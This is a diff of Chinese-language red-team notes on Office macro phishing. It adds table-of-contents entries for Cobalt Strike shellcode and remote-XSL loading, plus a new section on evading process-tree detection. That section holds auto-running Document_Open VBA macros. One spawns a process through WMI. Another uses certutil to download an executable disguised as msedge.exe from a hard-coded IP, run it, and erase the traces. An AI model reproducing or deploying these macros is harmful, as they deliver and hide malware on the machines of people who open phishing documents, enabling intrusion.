@@ -14,12 +14,20 @@
   - [调Certutil](#调certutil)
   - [调CScript调JSCript/VBScript](#调cscript调jscriptvbscript)
   - [调WScript调JSCript/VBScript](#调wscript调jscriptvbscript)
-  - [CobaltStrike宏钓鱼](#cobaltstrike宏钓鱼)
+  - [CobaltStrike宏钓鱼(DLL注入)](#cobaltstrike宏钓鱼dll注入)
     - [代码解析](#代码解析)
       - [结构体定义](#结构体定义)
       - [函数声明](#函数声明)
+  - [VBA宏加载远程XSL](#vba宏加载远程xsl)
+    - [利用方案](#利用方案)
+      - [生成 Shellcode(Payload.bin)](#生成-shellcodepayloadbin)
+      - [处理 payload.bin](#处理-payloadbin)
+      - [生成 xsl 和 macro](#生成-xsl-和-macro)
   - [相关链接](#相关链接)
   - [宏免杀](#宏免杀)
+    - [绕过基于进程树的检测](#绕过基于进程树的检测)
+      - [连接到 WMI 新建进程](#连接到-wmi-新建进程)
+      - [获取 WSH 对象调用 cmd 执行命令](#获取-wsh-对象调用-cmd-执行命令)
 
 ---
 
@@ -225,7 +233,7 @@ End Sub
 
 ---
 
-## CobaltStrike宏钓鱼
+## CobaltStrike宏钓鱼(DLL注入)
 
 ![image-20240701113038801](http://cdn.ayusummer233.top/DailyNotes/202407011130434.png)
 
@@ -853,6 +861,7 @@ End Type
 
 #### 生成 Shellcode(Payload.bin)
 
+
 用 `CobaltStrike` 生成 Shellcode
 
 ![image-20240704111814786](http://cdn.ayusummer233.top/DailyNotes/202407041118750.png)
@@ -973,15 +982,7 @@ End Sub
 - Cobalt Strike：通过插件实现上线后自动迁移进程，[Beacon Handler Suite](https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler)
 - Metasploit: 在设置监听的时间可以设置：`set autorunscript migrate -N explorer.exe 或 set autorunscript -f`
 
----
-
-
-
-
-
-
-
-
+> TODO: 看下这个进程迁移是怎么实现的
 
 ---
 
@@ -1008,7 +1009,43 @@ End Sub
 
 ---
 
+### 绕过基于进程树的检测
 
+#### 连接到 WMI 新建进程
+
+```vb
+Private Sub Document_Open()
+' 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+' 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息
+Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+' 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。
+Set objConfig = objStartup.SpawnInstance_
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
+End Sub
+```
+
+
+
+![image-20240711144920180](http://cdn.ayusummer233.top/DailyNotes/202407111449956.png)
+
+
+
+
+
+---
+
+#### 获取 WSH 对象调用 cmd 执行命令
+
+>  [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)
+
+```vb
+Private Sub Document_Open()
+Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+obj.Document.Application.ShellExecute "cmd.exe", "/c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", "C:\Windows\System32", Null, 0
+End Sub
+```
 
 
 
